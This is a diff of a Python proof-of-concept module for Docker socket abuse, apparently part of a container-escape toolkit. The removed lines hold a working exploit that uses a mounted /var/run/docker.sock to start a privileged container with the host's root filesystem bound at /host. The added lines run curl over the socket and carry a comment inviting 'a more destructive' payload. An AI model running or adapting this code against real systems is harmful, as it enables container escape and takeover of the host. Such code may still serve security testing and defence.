@@ -1,64 +1,39 @@
-import json
-import requests
-import os
-import time
+import subprocess
 
-def run(simulate=False):
-    report = {
-        "attack": "Docker Socket Abuse",
-        "cve": "N/A",
-        "description": "Abusing mounted /var/run/docker.sock to spawn container and execute commands.",
-        "simulate": simulate,
-        "exploit_executed": False,
-        "result": None,
-        "recommendation": "Avoid mounting docker.sock into containers unless absolutely necessary.",
-        "risk_level": "High"
-    }
+def run(container_name, simulate=False):
+    print("[+] Starting docker_socket_abuse PoC")
+    print(f"[+] Target container: {container_name}")
+    print(f"[+] Simulate mode: {simulate}")
 
     if simulate:
-        report["result"] = "Simulated use of docker.sock to spawn a container."
-        return report
+        print("[*] Simulating Docker socket abuse (no actual changes made).")
+        print("[*] Would run: curl --unix-socket /var/run/docker.sock http://localhost/containers/json")
+        return {"status": "simulated", "message": "Simulated Docker socket abuse."}
 
-    # === REAL EXPLOIT BEGINS ===
-    sock_path = "/var/run/docker.sock"
-    if not os.path.exists(sock_path):
-        report["result"] = "docker.sock not found. Exploit failed."
-        return report
+    # The actual payload - replace this with a more destructive one if needed
+    curl_cmd = [
+        "curl",
+        "--unix-socket", "/var/run/docker.sock",
+        "http://localhost/containers/json"
+    ]
 
-    base_url = "http+unix://%2Fvar%2Frun%2Fdocker.sock"
-    container_name = f"pwned-{int(time.time())}"
-
-    # 1. Create container
-    create_payload = {
-        "Image": "alpine",
-        "Cmd": ["touch", "/pwned_by_dockout"],
-        "HostConfig": {
-            "Binds": ["/:/host"],
-            "Privileged": True
-        }
-    }
+    print("[+] Executing real exploit payload via Docker socket...")
+    print("[+] Running:", " ".join(curl_cmd))
 
     try:
-        session = requests.Session()
-        adapter = requests.adapters.HTTPAdapter()
-        session.mount(base_url, adapter)
+        result = subprocess.run(curl_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
+        stdout_output = result.stdout.decode()
+        stderr_output = result.stderr.decode()
 
-        # create container
-        res = session.post(base_url + "/v1.41/containers/create?name=" + container_name, json=create_payload)
-        if res.status_code != 201:
-            report["result"] = f"Container create failed: {res.text}"
-            return report
+        print("[+] STDOUT:\n", stdout_output)
+        if stderr_output:
+            print("[!] STDERR:\n", stderr_output)
 
-        # start container
-        cid = res.json()["Id"]
-        start_res = session.post(base_url + f"/v1.41/containers/{cid}/start")
-        if start_res.status_code == 204:
-            report["exploit_executed"] = True
-            report["result"] = f"Exploit succeeded: container `{container_name}` started and wrote to /pwned_by_dockout."
-        else:
-            report["result"] = f"Container start failed: {start_res.text}"
-
+        return {
+            "status": "executed",
+            "stdout": stdout_output,
+            "stderr": stderr_output
+        }
     except Exception as e:
-        report["result"] = f"Exploit failed: {str(e)}"
-
-    return report
+        print(f"[!] Exploit failed: {str(e)}")
+        return {"status": "error", "error": str(e)}
